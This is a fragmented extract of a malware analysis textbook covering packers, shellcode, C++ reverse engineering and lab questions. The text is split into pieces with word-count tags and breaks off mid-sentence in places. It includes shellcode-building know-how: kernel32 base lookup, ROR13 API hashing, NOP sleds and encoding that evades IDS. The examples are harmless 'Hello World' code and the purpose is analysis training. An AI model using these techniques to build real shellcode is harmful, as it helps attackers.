00401004   ADD BYTE PTR DS:[EAX],AL
00401006   ADD BYTE PTR DS:[EAX],AL
00401008   ADD BYTE PTR DS:[EAX],AL
0040100A   ADD BYTE PTR DS:[EAX],AL
0040100C   ADD BYTE PTR DS:[EAX],AL
0040100E   ADD BYTE PTR DS:[EAX],AL
[Word Count: 40]

Listing 18-2: Instruction bytes stored at OEP before the original program is unpacked
[Word Count: 13]

Listing 18-3 contains the disassembly found at the same address when 
the tail jump is executed. The original executable has been unpacked, and 
there are now valid instructions at that location. This change is another hall-
mark of a tail jump.
[Word Count: 41]

00401000   CALL Sample84.004010DC
00401005   TEST EAX,EAX
00401007   JNZ SHORT Sample84.0040100E
00401009   CALL Sample84.00401018
0040100E   PUSH EAX
0040100F   CALL DWORD PTR DS:[414304] ; kernel32.ExitProcess
00401015   RETN
[Word Count: 25]

Listing 18-3: Instruction bytes stored at OEP after the original program is unpacked
[Word Count: 13]

OllyDump and ImpRec are usually able to rebuild the import table by search-
ing through the program in memory for what looks like a list of imported 
functions. But sometimes this fails, and you need to learn a little more about 
how the import table works in order to analyze the malware.
[Word Count: 52]

push eax
call dword_401244
...
dword_401244: 0x7c4586c8
[Word Count: 7]

Listing 18-4: Call to an imported function when the import table is not properly reconstructed
[Word Count: 15]

NOTE
Sometimes malware authors use more than one packer. This doubles the work for the 
analyst, but with persistence, it’s usually possible to unpack even double-packed mal-
ware. The strategy is simple: Undo the first layer of packing using any of the techniques 
we’ve just described, and then repeat to undo the second layer of packing. The strategies 
are the same, regardless of the number of packers used.
[Word Count: 68]

This section covers just a sampling of popular packers that you are likely to 
encounter when analyzing malware. For each packer covered, we’ve included a 
description and a strategy for unpacking manually. Automated unpackers are 
also listed for some of these, but they do not always work. For each packer, 
strategies for finding the OEP and potential complications are also included.
[Word Count: 61]

PECompact is a commercial packer designed for speed and performance. 
A discontinued free student version is still often used by malware authors. 
Programs packed with this packer can be difficult to unpack, because it 
includes anti-debugging exceptions and obfuscated code. PECompact has a 
plug-in framework that allows third-party tools to be incorporated, and mal-
ware authors often include third-party tools that make unpacking even more 
difficult.
[Word Count: 66]

Unpacking PECompact manually is largely the same as unpacking 
UPX. The program generates some exceptions, so you will need to have 
OllyDbg set to pass exceptions to the program. This was discussed in detail 
in Chapter 16.
You can find the OEP by looking for the tail jump. Step over a few func-
tions, and you will see a tail jump consisting of a jmp eax followed by many 
0x00 bytes.
[Word Count: 71]

WinUpack is a packer with a GUI front end, designed for optimal compres-
sion, and not for security. There is a command-line version of this packer 
called UPack, and there are automated unpackers specific to UPack and 
WinUpack.
[Word Count: 38]

Although security isn’t its focus, WinUpack does include security mea-
sures that make it difficult to find the OEP, and render techniques such as 
searching for the tail jump or using OllyDump useless. Listing 18-5 shows the 
tail jump for this executable.
[Word Count: 42]

010103A6   POP ECX
010103A7   OR ECX,ECX
010103A9   MOV DWORD PTR SS:[EBP+3A8],EAX
010103AF   POPAD
010103B0   JNZ SHORT Sample_upac.010103BA
010103B2   MOV EAX,1
010103B7   RETN 0C
010103BA PUSH Sample_upac.01005F85
010103BF RETN
010103C0   MOV EAX,DWORD PTR SS:[EBP+426]
010103C6   LEA ECX,DWORD PTR SS:[EBP+43B]
010103CC   PUSH ECX
010103CD   PUSH EAX
010103CE   CALL DWORD PTR SS:[EBP+F49]
010103D4   MOV DWORD PTR SS:[EBP+555],EAX
010103DA   LEA EAX,DWORD PTR SS:[EBP+447]
010103E0   PUSH EAX
010103E1   CALL DWORD PTR SS:[EBP+F51]
010103E7   MOV DWORD PTR SS:[EBP+42A],EAX
[Word Count: 72]

Listing 18-5: Tail jump for a program packed with UPack
[Word Count: 10]

Some programs, including those packed with Themida, can be very difficult 
to unpack. At times, you might spend all day trying to unpack a program and 
have no success. Perhaps the packer is using a new technique that you simply
[Word Count: 40]

This chapter covered a large number of strategies for dealing with packed 
software. We started with the basics of how packers work and how to unpack 
software, and then discussed some automated unpacking tools and strategies. 
Next, we covered techniques that can be used to manually unpack malicious 
software. No single strategy or tool will work in all cases, so you need to be 
familiar with several techniques.
In the next chapter, we will cover shellcode and strategies for recogniz-
ing and analyzing malicious shellcode.
[Word Count: 85]

Shellcode refers to a payload of raw executable code. 
The name shellcode comes from the fact that attackers 
would usually use this code to obtain interactive shell 
access on the compromised system. However, over 
time, the term has become commonly used to describe 
any piece of self-contained executable code.
[Word Count: 49]

Shellcode is often used alongside an exploit to subvert a running pro-
gram, or by malware performing process injection. Exploitation and process 
injection are similar in that the shellcode is added to a running program and 
executed after the process has started.
Shellcode requires its authors to manually perform several actions that 
software developers usually never worry about. For example, the shellcode 
package cannot rely on actions the Windows loader performs during normal 
program startup, including the following:
[Word Count: 78]


Placing the program at its preferred memory location
[Word Count: 9]


Applying address relocations if it cannot be loaded at its preferred 
memory location
[Word Count: 14]


Loading required libraries and resolving external dependencies
[Word Count: 8]

This chapter will introduce you to these shellcode techniques, demon-
strated by full, working real-world examples.
[Word Count: 16]

Position-independent code (PIC) is code that uses no hard-coded addresses for 
either code or data. Shellcode is PIC. It cannot assume that it will be located 
at a particular memory location when it executes, because at runtime, differ-
ent versions of a vulnerable program may load the shellcode into different 
memory locations. The shellcode must ensure that all memory access for 
both code and data uses PIC techniques.
Table 19-1 shows several common types of x86 code and data access, and 
whether they are PIC.
[Word Count: 85]

In the table, the call instruction contains a 32-bit signed relative displace-
ment that is added to the address immediately following the call instruction in 
order to calculate the target location. Because the call instruction shown 
in the table is located at 0x0040103A, adding the offset value 0xFFFFFFC1  
to the location of the instruction, plus the size of the call instruction (5 bytes), 
results in the call target 0x00401000.
The jnz instruction is very similar to call, except that it uses only an 8-bit 
signed relative displacement. The jnz instruction is located at 0x00401034.
[Word Count: 95]

Table 19-1: Different Types of x86 Code and Data Access
[Word Count: 10]

Instruction mnemonics
Instruction bytes
Position-independent?
[Word Count: 5]

mov     edx, dword_407030 
8B 15 30 70 40 00
No
[Word Count: 11]

Bytes            Disassembly
83 EC 20         sub     esp, 20h
31 D2            xor     edx, edx
E8 0D 00 00 00   call    sub_17 
48 65 6C 6C 6F   db 'Hello World!',0 
20 57 6F 72 6C
64 21 00
[Word Count: 38]

sub_17: 
5F               pop     edi             ; edi gets string pointer
52               push    edx               ; uType: MB_OK 
57               push    edi               ; lpCaption
57               push    edi               ; lpText
52               push    edx               ; hWnd: NULL
B8 EA 07 45 7E   mov     eax, 7E4507EAh    ; MessageBoxA
FF D0            call    eax 
52               push    edx               ; uExitCode
B8 FA CA 81 7C   mov     eax, 7C81CAFAh    ; ExitProcess
FF D0            call    eax 
[Word Count: 67]

Listing 19-1: call/pop Hello World example
[Word Count: 6]

To load and step through this example with shellcode_launcher.exe, enter 
the following at the command line:
[Word Count: 16]

shellcode_launcher.exe -i helloworld.bin -bp -L user32
[Word Count: 6]

The x87 floating-point unit (FPU) provides a separate execution environ-
ment within the normal x86 architecture. It contains a separate set of special-
purpose registers that need to be saved by the OS on a context switch when 
a process is performing floating-point arithmetic with the FPU. Listing 19-2 
shows the 28-byte structure used by the fstenv and fnstenv instructions to store 
the state of the FPU to memory when executing in 32-bit protected mode.
[Word Count: 75]

struct FpuSaveState {
    uint32_t    control_word;
    uint32_t    status_word;
    uint32_t    tag_word;
    uint32_t    fpu_instruction_pointer;
    uint16_t    fpu_instruction_selector;
    uint16_t    fpu_opcode;
    uint32_t    fpu_operand_pointer;
    uint16_t    fpu_operand_selector;
    uint16_t    reserved;
};
[Word Count: 22]

Listing 19-2: FpuSaveState structure definition
[Word Count: 5]

Bytes            Disassembly
83 EC 20         sub     esp, 20h
31 D2            xor     edx, edx
EB 15            jmp     short loc_1C
EA 07 45 7E      dd 7E4507EAh               ; MessageBoxA
FA CA 81 7C      dd 7C81CAFAh               ; ExitProcess
48 65 6C 6C 6F   db 'Hello World!',0
20 57 6F 72 6C 
64 21 00
[Word Count: 50]

D9 EE            fldz 
D9 74 24 F4      fnstenv byte ptr [esp-0Ch] 
5B               pop     ebx       
; ebx points to fldz 
8D 7B F3         lea     edi, [ebx-0Dh]  ; load HelloWorld pointer
52               push    edx                ; uType: MB_OK 
57               push    edi                ; lpCaption
57               push    edi                ; lpText
52               push    edx                ; hWnd: NULL
8B 43 EB         mov     eax, [ebx-15h]  ; load MessageBoxA
FF D0            call    eax                ; call MessageBoxA
52               push    edx                ; uExitCode
8B 43 EF         mov     eax, [ebx-11h]   ; load ExitProcess
FF D0            call    eax                ; call ExitProcess
[Word Count: 94]

Listing 19-3: fnstenv Hello World example
[Word Count: 6]

World! string by subtracting 0x0d from the address of the fldz instruction 
stored in EBX. The mov instruction at  loads the first function location for 
MessageBoxA, and the mov instruction at  loads the second function location 
for ExitProcess.
[Word Count: 40]

NOTE
Listing 19-3 is a contrived example, but it is common for shellcode to store or create 
function pointer arrays. We used the fldz instruction in this example, but any non-
control FPU instruction can be used.
[Word Count: 37]

This example can be executed using shellcode_launcher.exe with the follow-
ing command:
[Word Count: 12]

shellcode_launcher.exe -i hellofstenv.bin -bp -L user32
[Word Count: 6]


Parse kernel32.dll’s PE file and search the exported functions for 
LoadLibraryA and GetProcAddress.
[Word Count: 14]

In order to locate kernel32.dll, we’ll follow a series of undocumented 
Windows structures. One of these structures contains the load address 
of kernel32.dll.
[Word Count: 23]

NOTE
Most of the Windows structures are listed on the Microsoft Developer Network (MSDN) 
site, but they are not fully documented. Many contain byte arrays named Reserved, 
with the warning “This structure may be altered in future versions of Windows.” For 
full listings of these structures, see http://undocumented.ntinternals.net/.
[Word Count: 48]

Figure 19-1 shows the data structures that are typically followed in order 
to find the base address for kernel32.dll (only relevant fields and offsets within 
each structure are shown).
[Word Count: 29]

Figure 19-1: Structure traversal to find kernel32.dll DllBase
[Word Count: 8]

...
0x0c: PPEB_LDR_data ldr;
...
PEB_LDR_Data
[Word Count: 6]

0x14: LIST_ENTRY InMemoryOrderLinks;
0x1c: LIST_ENTRY InInitializationOrderLinks;
[Word Count: 6]

0x08: LIST_ENTRY InMemoryOrderLinks;
0x10: LIST_ENTRY InInitializationOrderLinks;
[Word Count: 6]

0x00: LIST_ENTRY InLoadOrderLinks;
0x08: LIST_ENTRY InMemoryOrderLinks;
0x10: LIST_ENTRY InInitializationOrderLinks;
0x18: PVOID DllBase;
...
0x24: UNICODE_STRING FullDllName;
[Word Count: 16]

Listing 19-4 contains sample assembly code that finds the base address of 
kernel32.dll.
[Word Count: 13]

; __stdcall DWORD findKernel32Base(void);
findKernel32Base:
    push    esi
    xor     eax, eax
    mov     eax, [fs:eax+0x30]  ; eax gets pointer to PEB
    test    eax, eax            
; if high bit set: Win9x
    js      .kernel32_9x 
    mov     eax, [eax + 0x0c] 
; eax gets pointer to PEB_LDR_DATA
    ;esi gets pointer to 1st
    ;LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks.Flink
    mov     esi, [eax + 0x1c]
    ;eax gets pointer to 2nd
    ;LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks.Flink
    lodsd 
    mov     eax, [eax + 8]      
; eax gets LDR_DATA_TABLE_ENTRY.DllBase
    jmp     near .finished
.kernel32_9x:
    jmp     near .kernel32_9x 
; Win9x not supported: infinite loop
.finished:
    pop     esi
    ret
[Word Count: 90]

Listing 19-4: findKernel32Base implementation
[Word Count: 4]

Once you find the base address for kernel32.dll, you must parse it to find 
exported symbols. As with finding the location of kernel32.dll, this process 
involves following several structures in memory.
[Word Count: 31]

sizeof(PE_Signature) + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER) = 120 bytes
[Word Count: 8]

1.
Iterate over the AddressOfNames array looking at each char* entry, and 
perform a string comparison against the desired symbol until a match 
is found. Call this index into AddressOfNames iName.
[Word Count: 31]

2.
Index into the AddressOfNameOrdinals array using iName. The value retrieved 
is the value iOrdinal.
[Word Count: 15]

3.
Use iOrdinal to index into the AddressOfFunctions array. The value 
retrieved is the RVA of the exported symbol. Return this value to the 
requester.
[Word Count: 25]

A sample implementation of this algorithm is shown later in the chapter 
as part of a full Hello World example.
[Word Count: 20]

Figure 19-2: kernel32.dll IMAGE_EXPORT_DIRECTORY
[Word Count: 4]

Once the shellcode finds LoadLibraryA, it can load arbitrary libraries. The 
return value of LoadLibraryA is treated as a HANDLE in the Win32 API. Examin-
ing the HANDLE values shows that it is actually a 32-bit pointer to the dllBase of 
the library that was loaded, which means that the shellcode can skip using 
GetProcAddress and continue using its own PE parsing code with the dllBase 
pointers returned from LoadLibraryA (which is also beneficial when hashed 
names are used, as explained in the next section).
[Word Count: 85]

The algorithm just discussed has a weakness: It performs a strcmp against 
each export name until it finds the correct one. This requires that the full 
name of each API function the shellcode uses be included as an ASCII string. 
When the size of the shellcode is constrained, these strings could push the 
size of the shellcode over the limit.
[Word Count: 60]

;BOOL __stdcall ActivateActCtx(HANDLE hActCtx, ULONG_PTR *lpCookie)
mov  edi, edi
push ebp
mov  ebp, esp
...
[Word Count: 15]

;ATOM __stdcall AddAtomA(LPCSTR lpString)
mov  edi, edi
push ebp
mov  ebp, esp
...
[Word Count: 13]

;ATOM __stdcall AddAtomW(LPCWSTR lpString)
mov  edi, edi
push ebp
mov  ebp, esp
...
[Word Count: 13]

...
0x18: NumberOfNames
0x1c: AddressOfFunctions
0x20: AddressOfNames
0x24: AddressOfNameOrdinals
[Word Count: 9]

A common way to address this problem is to calculate a hash of each 
symbol string and compare the result with a precomputed value stored in the 
shellcode. The hash function does not need to be sophisticated; it only needs 
to guarantee that within each DLL used by the shellcode, the hashes that the 
shellcode uses are unique. Hash collisions between symbols in different 
DLLs and between symbols the shellcode does not use are fine.
The most common hash function is the 32-bit rotate-right-additive hash, 
as shown in Listing 19-5.
[Word Count: 90]

; __stdcall DWORD hashString(char* symbol);
hashString:
    push    esi
    push    edi
    mov     esi, dword [esp+0x0c]   ; load function argument in esi
.calc_hash:
    xor     edi, edi 
    cld
.hash_iter:
    xor     eax, eax
    lodsb                 
; load next byte of input string
    cmp     al, ah
    je      .hash_done              ; check if at end of symbol
    ror     edi, 0x0d 
; rotate right 13 (0x0d)
    add     edi, eax
    jmp     near .hash_iter
.hash_done:
    mov     eax, edi
    pop     edi
    pop     esi
    retn    4
[Word Count: 76]

This function calculates a 32-bit DWORD hash value of the string pointer 
argument. The EDI register is treated as the current hash value, and is ini-
tialized to zero at . Each byte of the input string is loaded via the lodsb 
instruction at . If the byte is not NULL, the current hash is rotated right 
by 13 (0x0d) at , and the current byte is added into the hash. This hash is 
returned in EAX so that its caller can compare the result with the value 
compiled into the code.
[Word Count: 92]

NOTE
The particular algorithm in Listing 19-5 has become commonly used due to its inclu-
sion in Metasploit, but variations that use different rotation amounts and hash sizes 
are sometimes seen.
[Word Count: 31]

Listing 19-6 shows a full implementation of the findSymbolByHash function that 
can be used to find exported symbols in loaded DLLs.
[Word Count: 21]

Listing 19-6: findSymbolByHash implementation
[Word Count: 4]

Listing 19-7: Position-independent Hello World
[Word Count: 5]

NOTE
Using the shellcode’s PE parsing ability instead of GetProcAddress has the additional 
benefit of making reverse-engineering of the shellcode more difficult. The hash values 
hide the API calls used from casual inspection.
[Word Count: 33]

57                  push    edi
50                  push    eax             ; phkResult
6A 01               push    1               ; samDesired
8D 8B D0 13 00 00   lea     ecx, [ebx+13D0h]
6A 00               push    0               ; ulOptions
51                  push    ecx             ; lpSubKey
68 02 00 00 80      push    80000002h       ; hKey: HKEY_LOCAL_MACHINE
FF 15 20 00 42 00   call    ds:RegOpenKeyExA
[Word Count: 52]

Listing 19-8: Typical code with highlighted NULL bytes
[Word Count: 8]

Programs may perform additional sanity checks on data that the shell-
code must pass in order to succeed, such as the following:
[Word Count: 22]


All bytes are printable (less than 0x80) ASCII bytes.
[Word Count: 10]


All bytes are alphanumeric (A through Z, a through z, or 0 through 9).
[Word Count: 15]


XOR all payload bytes with constant byte mask. Remember that for all 
values of the same size a,b that (a XOR b) XOR b == a.
[Word Count: 27]


Use an alphabetic transform where a single byte of payload is split 
into two 4-bit nibbles and added to a printable ASCII character (such 
as A or a).
[Word Count: 29]

Shellcode encodings have additional benefits for the attackers, in that 
they make analysis more difficult by hiding human-readable strings such as 
URLs or IP addresses. Also, they may help evade network IDSs.
[Word Count: 32]

A NOP sled (also known as a NOP slide) is a long sequence of instructions pre-
ceding shellcode, as shown in Figure 19-3. NOP sleds are not required to be 
present with shellcode, but they are often included as part of an exploit to 
increase the likelihood of the exploit succeeding. Shellcode authors can do 
this by creating a large NOP sled immediately preceding the shellcode. As 
long as execution is directed somewhere within the NOP sled, the shellcode 
will eventually run.
[Word Count: 82]

Figure 19-3: NOP sled and shellcode layout
[Word Count: 7]

Traditional NOP sleds are made up of long sequences of the NOP (0x90) 
instruction, but exploit authors can be creative in order to avoid detection. 
Other popular opcodes are in the 0x40 to 0x4f range. These opcodes are single-
byte instructions that increment or decrement the general-purpose registers.
[Word Count: 48]

This opcode byte range also consists of only printable ASCII characters. This 
is often useful because the NOP sled executes before the decoder runs, so it 
must pass the same filtering requirements as the rest of the shellcode.
[Word Count: 38]

%u1122%u3344%u5566%u7788%u99aa%ubbcc%uddee
[Word Count: 1]

It will be decoded to the following binary byte sequence:
[Word Count: 10]

22 11 44 33 66 55 88 77 aa 99 cc bb ee dd
[Word Count: 14]

A % symbol that is not immediately followed by the letter u is treated as a 
single encoded hex byte. For example, the text string %41%42%43%44 will be 
decoded to the binary byte sequence 41 42 43 44.
[Word Count: 38]

NOTE
Both single- and double-byte encoded characters can be used within the same text string. 
This is a popular technique wherever JavaScript is used, including in PDF documents.
[Word Count: 28]

Finding shellcode usually means searching for the initial decoder that is 
likely present at the start of the shellcode. Useful opcodes to search for are 
listed in Table 19-2.
[Word Count: 29]

Table 19-2: Some Opcode Bytes to Search For
[Word Count: 8]

Short conditional jumps
0x70 through 0x7f
[Word Count: 6]

In these labs, we’ll use what we’ve covered in Chapter 19 to analyze samples 
inspired by real shellcode. Because a debugger cannot easily load and run 
shellcode directly, we’ll use a utility called shellcode_launcher.exe to dynamically 
analyze shellcode binaries. You’ll find instructions on how to use this utility 
in Chapter 19 and in the detailed analyses in Appendix C.
[Word Count: 59]

Analyze the file Lab19-01.bin using shellcode_launcher.exe.
[Word Count: 6]

2.
Which functions does the shellcode manually import?
[Word Count: 8]

3.
What network host does the shellcode communicate with?
[Word Count: 9]

4.
What filesystem residue does the shellcode leave?
[Word Count: 8]

The file Lab19-02.exe contains a piece of shellcode that will be injected into 
another process and run. Analyze this file.
[Word Count: 20]

1.
What process is injected with the shellcode?
[Word Count: 8]

4.
Which functions does the shellcode manually import?
[Word Count: 8]

5.
What network hosts does the shellcode communicate with?
[Word Count: 9]

Analyze the file Lab19-03.pdf. If you get stuck and can’t find the shellcode, 
just skip that part of the lab and analyze file Lab19-03_sc.bin using 
shellcode_launcher.exe.
[Word Count: 26]

3.
Which functions does the shellcode manually import?
[Word Count: 8]

4.
What filesystem residue does the shellcode leave?
[Word Count: 8]

Malware analysis is conducted without access to source 
code, but the specific source language has a significant 
impact on the assembly. For example, C++ has several 
features and constructs that do not exist in C, and 
these can complicate analysis of the resulting assembly.
[Word Count: 44]

Malicious programs written in C++ create challenges for the malware 
analyst that make it harder to determine the purpose of assembly code. 
Understanding basic C++ features and how they appear in assembly lan-
guage is critical to analyzing malware written in C++.
[Word Count: 42]

Unlike C, C++ is an object-oriented programming language, following a pro-
gramming model that uses objects that contain data as well as functions to 
manipulate the data. The functions in object-oriented programming are like 
functions in C programs, except that they are associated with a particular 
object or class of objects. Functions within a C++ class are often called methods
[Word Count: 60]

to draw a distinction. Although many features of object-oriented program-
ming are irrelevant to malware analysis because they do not impact the 
assembly, a few can complicate analysis.
[Word Count: 28]

NOTE
To learn more about C++, consider reading Thinking in C++ by Bruce Eckel, avail-
able as a free download from http://www.mindviewinc.com/.
[Word Count: 22]

class SimpleClass {
public:
      int x;
      void HelloWorld() {
            printf("Hello World\n");
      }
};
[Word Count: 13]

int _tmain(int argc, _TCHAR* argv[])
{
      SimpleClass myObject;
      myObject.HelloWorld();
}
[Word Count: 10]

In this example, the class is called SimpleClass. It has one data element, 
x, and a single function, HelloWorld. We create an instance of SimpleClass 
named myObject and call the HelloWorld function for that object. (The public 
keyword is a compiler-enforced abstraction mechanism with no impact on 
the assembly code.)
[Word Count: 50]

As we have established, data and functions are associated with objects. In 
order to access a piece of data, you use the form ObjectName.variableName. 
Functions are called similarly with ObjectName.functionName. For example, in 
Listing 20-1, if we wanted to access the x variable, we would use myObject.x.
[Word Count: 47]

In addition to accessing variables using the object name and the variable 
name, you can also access variables for the current object using only the vari-
able name. Listing 20-2 shows an example.
[Word Count: 33]

class SimpleClass {
public:
      int x;
      void HelloWorld() {
            if (x == 10) printf("X is 10.\n");
      }
      ...
};
[Word Count: 19]

int _tmain(int argc, _TCHAR* argv[])
{
      SimpleClass myObject;
myObject.x = 9;
myObject.HelloWorld();
      SimpleClass myOtherObject;
      myOtherOject.x = 10;
      myOtherObject.HelloWorld();
}
[Word Count: 19]

Listing 20-2: A C++ example with the this pointer
[Word Count: 9]

The assembly in Listing 20-3, generated from Listing 20-2, demonstrates 
the usage of the this pointer.
[Word Count: 16]

;Main Function
00401100                 push    ebp
00401101                 mov     ebp, esp
00401103                 sub     esp, 1F0h
00401109
mov     [ebp+var_10], offset off_404768
00401110
mov     [ebp+var_C], 9
00401117
lea     ecx, [ebp+var_10]
0040111A                 call    sub_4115D0
0040111F                 mov     [ebp+var_34], offset off_404768
00401126                 mov     [ebp+var_30], 0Ah
0040112D
lea     ecx, [ebp+var_34]
00401130                 call    sub_4115D0
[Word Count: 45]

;HelloWorld Function
004115D0                 push    ebp
004115D1                 mov     ebp, esp
004115D3                 sub     esp, 9Ch
004115D9                 push    ebx
004115DA                 push    esi
004115DB                 push    edi
004115DC                 mov   [ebp+var_4], ecx
004115DF                 mov   eax, [ebp+var_4]
004115E2                 cmp     dword ptr [eax+4], 0Ah
004115E6                 jnz     short loc_4115F6
004115E8                 push    offset aXIs10_  ; "X is 10.\n"
004115ED                 call    ds:__imp__printf
[Word Count: 51]

Listing 20-3: The this pointer shown in disassembly
[Word Count: 8]

C++ supports a coding construct known as method overloading, which is the 
ability to have multiple functions with the same name, but that accept differ-
ent parameters. When the function is called, the compiler determines which 
version of the function to use based on the number and types of parameters 
used in the call, as shown in Listing 20-4.
[Word Count: 59]

LoadFile (String filename) {
...
}
LoadFile (String filename, int Options) {
...
}
[Word Count: 14]

Main () {
      LoadFile ("c:\myfile.txt"); //Calls the first LoadFile function
      LoadFile ("c:\myfile.txt", GENERIC_READ); //Calls the second LoadFile
}
[Word Count: 18]

Listing 20-4: Function overloading example
[Word Count: 5]

Figure 20-1: IDA Pro listing of a demangled function name
[Word Count: 10]

The internal function names are visible only if there are symbols in the 
code you are analyzing. Malware usually has the internal symbols removed; 
however, some imported or exported C++ functions with mangled names 
may be visible in IDA Pro.
[Word Count: 40]

Inheritance is an object-oriented programming concept in which parent-child 
relationships are established between classes. Child classes inherit functions 
and data from parent classes. A child class automatically has all the functions 
and data of the parent class, and usually defines additional functions and 
data. For example, Listing 20-5 shows a class called Socket.
[Word Count: 53]

class Socket {
...
public:
      void setDestinationAddr (INetAddr * addr) {
      ...
      }
      ...
};
[Word Count: 15]

class UDPSocket : publicSocket {
public:
void sendData (char * buf, INetAddr * addr) {
    setDestinationAddr(addr)
...
      }
      ...
};
[Word Count: 21]

Table 20-1: Source Code Example for Virtual Functions
[Word Count: 8]

class A {
public:
      void foo() {
            printf("Class A\n");
      }
};
[Word Count: 11]

class B : public A {
public:
      void foo() {
            printf("Class B\n");
      }
};
[Word Count: 14]

int _tmain(int argc, _TCHAR* argv[])
{
      B b;
      A a;
      g(b);
      return 0;
}
[Word Count: 14]

class A {
public:
virtual void foo() {
            printf("Class A\n");
      }
};
[Word Count: 12]

class B : public A {
public:
virtual void foo() {
            printf("Class B\n");
      }
};
[Word Count: 15]

int _tmain(int argc, _TCHAR* argv[])
{
      B b;
      A a;
      g(b);
      return 0;
}
[Word Count: 14]

The C++ compiler will add special data structures when it compiles code to 
support virtual functions. These data structures are called virtual function 
tables, or vtables. These tables are simply arrays of function pointers. Each 
class using virtual functions has its own vtable, and each virtual function in 
a class has an entry in the vtable.
Table 20-2 shows a disassembly of g function from the two code snippets 
in Table 20-1. On the left is the nonvirtual function call to foo, and on the 
right is the virtual call.
[Word Count: 90]

The source code change is small, but the assembly looks completely dif-
ferent. The function call on the left looks the same as the C functions that we 
have seen before. The virtual function call on the right looks different. The 
biggest difference is that we can’t see the destination for the call instruction, 
which can pose a big problem when analyzing disassembled C++, because we 
need to track down the target of the call instruction.
[Word Count: 76]

Table 20-2: Assembly Code of the Example from Table 20-1
[Word Count: 10]

Non-virtual function call
Virtual function call
[Word Count: 6]

00401000   push    ebp
00401001   mov     ebp, esp
00401003   mov     ecx, [ebp+arg_0]
00401006   call    sub_401030
0040100B   pop     ebp
0040100C   retn
[Word Count: 19]

00401000   push    ebp
00401001   mov     ebp, esp
00401003   mov
eax, [ebp+arg_0]
00401006   mov
 edx, [eax]
00401008   mov     ecx, [ebp+arg_0]
0040100B   mov     eax, [edx]
0040100D   call    eax
0040100F   pop     ebp
00401010   retn
[Word Count: 31]

Figure 20-2: C++ object with a virtual function table (vtable)
[Word Count: 10]

To figure out which function is being called, you find where the vtable is 
being accessed, and you see which offset is being called. In Table 20-2, we see 
the first vtable entry being accessed. To find the code that is called, we must 
find the vtable in memory and then go to the first function in the list.
Nonvirtual functions do not appear in a vtable because there is no need 
for them. The target for nonvirtual function calls is fixed at compile time.
[Word Count: 85]

NOTE
In this example, the line labeled off_4020F0 is the beginning of the vtable, but don’t 
confuse this with switch offset tables, covered in Chapter 6. A switch offset table 
would have offsets to locations that are not subroutines, labeled loc_###### instead 
of sub_######.
[Word Count: 44]

004020F0 off_4020F0      dd offset sub_4010A0
004020F4                 dd offset sub_4010C0
004020F8                 dd offset sub_4010E0
[Word Count: 13]

You can recognize virtual functions by their cross-references. Virtual 
functions are not directly called by other parts of the code, and when you 
check cross-references for a virtual function, you should not see any calls to 
that function. For example, Figure 20-3 shows the cross-references for a vir-
tual function. Both cross-references are offsets to the function, and neither is 
a call instruction. Virtual functions almost always appear this way, whereas 
nonvirtual functions are typically referenced via a call instruction.
[Word Count: 80]

Figure 20-3: Cross-references for a virtual function
[Word Count: 7]

Once you have found a vtable and virtual functions, you can use that 
information to analyze them. When you identify a vtable, you instantly know 
that all functions within that table belong to the same class, and that func-
tions within the same class are somehow related. You can also use vtables to 
determine if class relationships exist. 
Listing 20-7, an expansion of Listing 20-6, includes vtables for two classes.
[Word Count: 70]

004020DC off_4020DC      dd offset sub_401100
004020E0                 dd offset sub_4010C0
004020E4
dd offset sub_4010E0
004020E8                 dd offset sub_401120
004020EC                 dd offset unk_402198
004020F0 off_4020F0      dd offset sub_4010A0
004020F4                 dd offset sub_4010C0
004020F8
dd offset sub_4010E0
[Word Count: 34]

Listing 20-7: Vtables for two different classes
[Word Count: 7]

NOTE
Object creation and deletion are key elements of the execution flow for a C++ program. 
Reverse-engineering these routines can usually provide key insight into the object layout 
and aid analysis in other member functions.
[Word Count: 35]

00401070  push    ebp
00401071  mov     ebp, esp
00401073  sub     esp, 1Ch
00401076  mov     [ebp+var_10],  offset off_4020F0
0040107D  mov     [ebp+var_10],  offset off_4020DC
00401084  mov     [ebp+var_4], offset off_4020F0
0040108B  push    4
0040108D  call    ??2@YAPAXI@Z    ; operator new(uint)
[Word Count: 37]

Listing 20-8: The new operator in disassembly
[Word Count: 7]

In order to analyze malicious programs written in C++, you need to under-
stand C++ features and how they affect the assembly code. By understanding 
inheritance, vtables, the this pointer, and name mangling, you won’t be 
slowed down by C++ code, and you’ll be able to take advantage of any clues 
provided by the additional structure created by C++ classes.
[Word Count: 60]

The purpose of this first lab is to demonstrate the usage of the this pointer. 
Analyze the malware in Lab20-01.exe.
[Word Count: 20]

1.
Does the function at 0x401040 take any parameters?
[Word Count: 9]

2.
Which URL is used in the call to URLDownloadToFile?
[Word Count: 10]

The purpose of this second lab is to demonstrate virtual functions. Analyze 
the malware in Lab20-02.exe.
[Word Count: 16]

NOTE
This program is not dangerous to your computer, but it will try to upload possibly sensi-
tive files from your machine.
[Word Count: 22]

1.
What can you learn from the interesting strings in this program?
[Word Count: 12]

2.
What do the imports tell you about this program?
[Word Count: 10]

3.
What is the purpose of the object created at 0x4011D9? Does it have any 
virtual functions?
[Word Count: 17]

4.
Which functions could possibly be called by the call [edx] instruction at 
0x401349?
[Word Count: 14]

5.
How could you easily set up the server that this malware expects in order 
to fully analyze the malware without connecting it to the Internet?
[Word Count: 26]

7.
What is the purpose of implementing a virtual function call in this 
program?
[Word Count: 14]

This third lab is a longer and more realistic piece of malware. This lab comes 
with a configuration file named config.dat that must be in the same directory 
as the lab in order to execute properly. Analyze the malware in Lab20-03.exe.
[Word Count: 41]

1.
What can you learn from the interesting strings in this program?
[Word Count: 12]

2.
What do the imports tell you about this program?
[Word Count: 10]

3.
The function 0x4036F0 is called multiple times and each time it takes 
the string Config error, followed a few instructions later by a call to 
CxxThrowException. Does the function take any parameters other than 
the string? Does the function return anything? What can you tell about 
this function from the context in which it’s used?
[Word Count: 56]

4.
What do the six entries in the switch table at 0x4025C8 do?
[Word Count: 13]

Almost all current malware is 32-bit, but some is writ-
ten for the 64-bit architecture in order to interact 
with 64-bit OSs. As 64-bit OSs become more popular, 
so will 64-bit malware.
[Word Count: 32]

associated with 64-bit malware analysis is that not all tools support x64 assem-
bly. For example, as of this writing, OllyDbg does not support 64-bit applica-
tions, although WinDbg does. IDA Pro supports x64 assembly, but it requires 
the IDA Pro Advanced version.
This chapter addresses the differences between 32-bit and 64-bit systems, 
and provides a few hints to help analyze 64-bit code.
[Word Count: 63]

